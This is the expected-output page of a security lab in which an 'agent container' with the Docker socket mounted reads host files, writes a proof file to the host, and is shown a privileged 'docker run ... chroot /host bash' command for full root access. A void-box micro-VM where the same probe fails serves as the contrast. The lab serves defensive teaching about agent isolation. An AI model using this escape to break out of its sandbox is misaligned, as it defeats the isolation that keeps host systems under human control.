# Expected Output: Lab 02 - Docker Socket Escape

> Terminal output includes color highlighting (bold headers, red/green/yellow for
> PASS/FAIL/WARN, colored summary table). Colors are auto-disabled when piped.

```
=== Lab 02: Docker Socket Escape ===

[Host]   hostname=your-hostname  kernel=6.x.x-...
[*] void-box not found — void-box sections will show expected behavior.
    ...

[*] Launching an 'agent container' with the Docker socket mounted...
[*] This simulates an agent that needs to orchestrate other containers.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Docker: Socket Escape
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[Docker] Inside the agent container:
    hostname=abc123def456
    kernel=6.10.14-linuxkit
    docker_socket=srw-rw----    1 root     root         0 ... /var/run/docker.sock

[*] Step 1: Querying host Docker daemon via mounted socket...
    host_docker_id=bd7edf08-d98a-...
    running_containers=1

[*] Step 2: Creating sibling container to read host files...

    [sibling] /etc/passwd (first 5 users):
    root:x:0:0:root:/root:/bin/bash
    ...
    ... (N users total)

    [sibling] /etc/hostname:
    docker-desktop

[*] Step 3: Writing proof file to host /tmp via sibling container...
    proof_file_content=ESCAPED_VIA_DOCKER_SOCKET

[!] Step 4: Full escalation potential...
    The agent container can also create privileged sibling containers:
    docker run --rm --privileged -v /:/host alpine chroot /host bash
    This gives root access to the entire host filesystem.

[Docker] Environment probe results:
    docker_socket=YES
    docker_cli=YES
    can_query_daemon=YES  daemon_id=bd7edf08-...
    can_read_host=YES  host_hostname=docker-desktop
    can_write_host=YES
    probe_hostname=abc123def456  probe_kernel=6.10.14-linuxkit

[Docker] Verifying exploit results...
    [PASS] docker_socket=YES (socket mounted and accessible)
    [PASS] can_query_daemon=YES (host Docker daemon reachable)
    [PASS] can_read_host=YES (read host /etc/hostname via sibling container)
    [PASS] can_write_host=YES (wrote proof file to host /tmp via sibling)

[Docker] RESULT: Full host access via Docker socket. (4/4 assertions passed)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Void-Box: Same Escape Attempt
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[*] The agent tries the same escape — but there's no Docker socket in the VM.
[*] Running the SAME probe.sh inside a void-box micro-VM...

[Void-Box] Expected (void-box not installed):
    docker_socket=NO          (no Docker socket in the VM)
    docker_cli=NO             (docker command not installed)
    can_query_daemon=NO       (no daemon to query)
    can_read_host=NO          (cannot create sibling containers)
    can_write_host=NO         (cannot write to host filesystem)
    probe_kernel=<vm-kernel>  (different from host)

[Void-Box] Assertions skipped (void-box not installed).
[Void-Box] Expected: no Docker socket, no escape path, blast radius contained.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Summary
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─────────────────────┬──────────────────────────┬──────────────────────────┐
│                     │ Docker                   │ Void-Box                 │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Docker socket?      │ YES (mounted)            │ NO (expected)            │
│ Read host files?    │ YES (via sibling)        │ NO (expected)            │
│ Write host files?   │ YES (via sibling)        │ NO (expected)            │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Blast radius        │ HIGH                     │ NONE                     │
└─────────────────────┴──────────────────────────┴──────────────────────────┘

[*] Mounting the Docker socket = giving root access to the host.
    The agent can create privileged sibling containers with full host mounts.
    Void-box eliminates the attack surface entirely: no socket, no daemon, no escape.
```

## With void-box installed

When void-box is available, the void-box section shows live results with assertions:

```
[Void-Box] Environment probe results:
    docker_socket=NO
    docker_cli=NO
    can_query_daemon=NO
    can_read_host=NO
    can_write_host=NO
    probe_hostname=void-box  probe_kernel=6.1.x

[Void-Box] Verifying isolation claims...
    [PASS] docker_socket=NO (no Docker socket in the VM)
    [PASS] docker_cli=NO (docker command not installed)
    [PASS] can_query_daemon=NO (no daemon to query)
    [PASS] can_read_host=NO (cannot create sibling containers)
    [PASS] can_write_host=NO (cannot write to host filesystem)
    [PASS] kernel=6.1.x (different from host: 25.3.0)

[Void-Box] RESULT: No Docker socket, no escape path. Blast radius contained.
```

## Key Observations

1. **The Docker socket is root access**: Mounting `/var/run/docker.sock` lets the container create arbitrary sibling containers with any host mount. This is by design, not a misconfiguration.

2. **Bidirectional escape proven**: The probe verifies both read (host `/etc/hostname`) and write (proof file to host `/tmp`) access via sibling containers. Both verified by assertions.

3. **Same probe, both environments**: The identical `probe.sh` runs in Docker (where docker CLI + socket enables escape) and void-box (where no docker exists). The difference in results comes from the environment, not from different code.

4. **Void-box eliminates the attack surface**: There's no Docker daemon, no socket, no CLI. The escape path simply doesn't exist — it's not blocked, it's absent.

5. **Common in agent setups**: Many agent frameworks mount the Docker socket for container orchestration. This lab demonstrates why that's equivalent to disabling isolation entirely.
